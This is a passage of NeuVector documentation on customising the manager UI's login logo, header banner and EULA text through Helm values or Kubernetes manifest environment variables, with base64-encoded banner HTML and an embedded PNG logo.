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"/>
  </svg>

   Run the following command in the neuvector-helm/charts/core to upgrade the NeuVector Helm chart:  helm upgrade neuvector -n neuvector ./   This will apply the customization changes to the UI pages.  ","version":"Next 🚧","tagName":"h3"},{"title":"Verification​","type":1,"pageTitle":"Custom Login, Header and Footer","url":"/next/configuration/customui#verification","content":" To verify that the environment variables have been successfully set, you can run the following command:  kubectl get deployment -n neuvector neuvector-manager-pod -o yaml   Check the spec.template.spec.containers.env section to ensure that the desired environment variables are present.  spec: progressDeadlineSeconds: 600 replicas: 1 revisionHistoryLimit: 10 selector: matchLabels: app: neuvector-manager-pod strategy: rollingUpdate: maxSurge: 25% maxUnavailable: 25% type: RollingUpdate template: metadata: creationTimestamp: null labels: app: neuvector-manager-pod release: neuvector spec: containers: - env: - name: CTRL_SERVER_IP value: neuvector-svc-controller.neuvector - name: CUSTOM_PAGE_HEADER_COLOR value: '#ff8c00' - name: CUSTOM_PAGE_HEADER_CONTENT value: WW91IGFyZSBhY2Nlc3NpbmcgYSAmbmJzcDs8Yj4gVS5TLiBHb3Zlcm5tZW50IChVU0cpIEluZm9ybWF0aW9uIFN5c3RlbSAoSVMpIDwvYj4gICAgICB0aGF0IGlzIHByb3ZpZGVkIGZvciBVU0ctYXV0aG9yaXplZCB1c2Ugb25seS4= - name: CUSTOM_EULA_POLICY value: PGg0PgogIFlvdSBhcmUgYWNjZXNzaW5nIGEgVS5TLiBHb3Zlcm5tZW50IChVU0cpIEluZm9ybWF0aW9uIFN5c3RlbSAoSVMpIHRoYXQgaXMgcHJvdmlkZWQgZm9yIFVTRy1hdXRob3JpemVkIHVzZSBvbmx5LgpCeSB1c2luZyB0aGlzIElTICh3aGljaCBpbmNsdWRlcyBhbnkgZGV2aWNlIGF0dGFjaGVkIHRvIHRoaXMgSVMpLCB5b3UgY29uc2VudCB0byB0aGUgZm9sbG93aW5nIGNvbmRpdGlvbnM6CjwvaDQ+CjxwPgotVGhlIFVTRyByb3V0aW5lbHkgaW50ZXJjZXB0cyBhbmQgbW9uaXRvcnMgY29tbXVuaWNhdGlvbnMgb24gdGhpcyBJUyBmb3IgcHVycG9zZXMgaW5jbHVkaW5nLCBidXQgbm90IGxpbWl0ZWQgdG8sIHBlbmV0cmF0aW9uIHRlc3RpbmcsIENPTVNFQyBtb25pdG9yaW5nLCBuZXR3b3JrIG9wZXJhdGlvbnMgYW5kIGRlZmVuc2UsIHBlcnNvbm5lbCBtaXNjb25kdWN0IChQTSksIGxhdyBlbmZvcmNlbWVudCAoTEUpLCBhbmQgY291bnRlcmludGVsbGlnZW5jZSAoQ0kpIGludmVzdGlnYXRpb25zLgo8L3A+CjxwPgotQXQgYW55IHRpbWUsIHRoZSBVU0cgbWF5IGluc3BlY3QgYW5kIHNlaXplIGRhdGEgc3RvcmVkIG9uIHRoaXMgSVMuCjwvcD4K - name: CUSTOM_LOGIN_LOGO value: <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" height="80" xml:space="preserve" version="1.1" viewBox="0 0 300 80">
    <image width="300" height="80" xlink:href="data:image/png;base64,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"/>
  </svg>

   5. Example to customize the UI pages using manifests​  Prerequisites​  Before customizing the UI component, ensure that you have the following:  NeuVector manifest repository: https://github.com/neuvector/manifestsNeuVector installed on your Kubernetes cluster  Steps​  Follow these steps to customize the UI component:  Locate the NeuVector manifests repository in your local environment: https://github.com/neuvector/manifests.Navigate to the manifests/kubernetes directory.Choose the right manifest according to your environment. For example, choose neuvector-containerd-k8s.yaml for a k8s cluster with containerd container runtime.Locate the neuvector-manager-pod deployment section in the manifest file to add the environment variables: CUSTOM_PAGE_HEADER_COLOR: Set the banner color to DarkOrange (#ff8c00).CUSTOM_PAGE_HEADER_CONTENT: Specify the header text using a plain HTML or text, for example &quot;You are accessing a U.S. Government (USG) Information System (IS) that is provided for USG-authorized use only.&quot;, remember to based64 encode it.CUSTOM_EULA_POLICY: Customize the policy content using a plain HTML snippet or text and remember to base64 encode it.CUSTOM_LOGIN_LOGO: Customize the logo with a 300x80 pixel svg file and base64 encode it  --- apiVersion: apps/v1 kind: Deployment metadata: name: neuvector-manager-pod namespace: neuvector spec: selector: matchLabels: app: neuvector-manager-pod replicas: 1 template: metadata: labels: app: neuvector-manager-pod spec: serviceAccountName: basic serviceAccount: basic containers: - name: neuvector-manager-pod image: neuvector/manager:5.3.0 env: - name: CUSTOM_PAGE_HEADER_COLOR value: &quot;#ff8c00&quot; - name: CUSTOM_PAGE_HEADER_CONTENT value: WW91IGFyZSBhY2Nlc3NpbmcgYSAmbmJzcDs8Yj4gVS5TLiBHb3Zlcm5tZW50IChVU0cpIEluZm9ybWF0aW9uIFN5c3RlbSAoSVMpIDwvYj4gICAgICB0aGF0IGlzIHByb3ZpZGVkIGZvciBVU0ctYXV0aG9yaXplZCB1c2Ugb25seS4= - name: CUSTOM_EULA_POLICY value: PGg0PgogIFlvdSBhcmUgYWNjZXNzaW5nIGEgVS5TLiBHb3Zlcm5tZW50IChVU0cpIEluZm9ybWF0aW9uIFN5c3RlbSAoSVMpIHRoYXQgaXMgcHJvdmlkZWQgZm9yIFVTRy1hdXRob3JpemVkIHVzZSBvbmx5LgpCeSB1c2luZyB0aGlzIElTICh3aGljaCBpbmNsdWRlcyBhbnkgZGV2aWNlIGF0dGFjaGVkIHRvIHRoaXMgSVMpLCB5b3UgY29uc2VudCB0byB0aGUgZm9sbG93aW5nIGNvbmRpdGlvbnM6CjwvaDQ+CjxwPgotVGhlIFVTRyByb3V0aW5lbHkgaW50ZXJjZXB0cyBhbmQgbW9uaXRvcnMgY29tbXVuaWNhdGlvbnMgb24gdGhpcyBJUyBmb3IgcHVycG9zZXMgaW5jbHVkaW5nLCBidXQgbm90IGxpbWl0ZWQgdG8sIHBlbmV0cmF0aW9uIHRlc3RpbmcsIENPTVNFQyBtb25pdG9yaW5nLCBuZXR3b3JrIG9wZXJhdGlvbnMgYW5kIGRlZmVuc2UsIHBlcnNvbm5lbCBtaXNjb25kdWN0IChQTSksIGxhdyBlbmZvcmNlbWVudCAoTEUpLCBhbmQgY291bnRlcmludGVsbGlnZW5jZSAoQ0kpIGludmVzdGlnYXRpb25zLgo8L3A+CjxwPgotQXQgYW55IHRpbWUsIHRoZSBVU0cgbWF5IGluc3BlY3QgYW5kIHNlaXplIGRhdGEgc3RvcmVkIG9uIHRoaXMgSVMuCjwvcD4K - name: CUSTOM_LOGIN_LOGO value: <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" height="80" xml:space="preserve" version="1.1" viewBox="0 0 300 80">
    <image width="300" height="80" xlink:href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAABQCAYAAACj6kh7AAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAALiMAAC4jAXilP3YAABMkSURBVHhe7Z0JcBTXmcfFYSfYsUHCIMB4cWXJRW0lu0gCcRhhc5rTXMYGZkZISGAkIQTmCoThxiAw0QkCoYNb4hICZ2s369i1m10nXnsrjrNxtrx2srWprdiO46zXju0Y6P1/T9+Me960Rj2jkaal+X5V/5p5733vzesevb/6TXe/ThAEQRAEQRAEQRAEQRAEQRAEQRAEQRAEQRAEQRAEQRAEQRAEQRAEQRAEQRACmbuu5oEFG07vmL/h1M2Fm84YpEWbzhxbsPG0h0MEQRBiw2Mb6mc99vSpC/M2nDLmbzhtzN942oA5KZkMy1i0+azxOGmL0gsLt5wu4SYEQRA6hjlrayvnrK//6dz19QaMSmkeKQzDWkz67jnjCb/Ovr1489kG/ghBEITw8Xq9PWcU1b41q6jug9nr6ow56+qVyKyiaVhPbiWdN5Zsa9HSbef++OS2C29yNwRBEIKZW1jbb8aampsz19YapFmkojpjNqlTDQv63gVjGcu1Xb1+kltVdQd3VRCEeOKRlXX3zyisnjB9TY3xKGtGYY0xs7DFrJxmWK7tDYbb2yKPt9Hw7GgwXPuufH2p9wf38iYJgtA9MHpMW3X8oSn51TXT8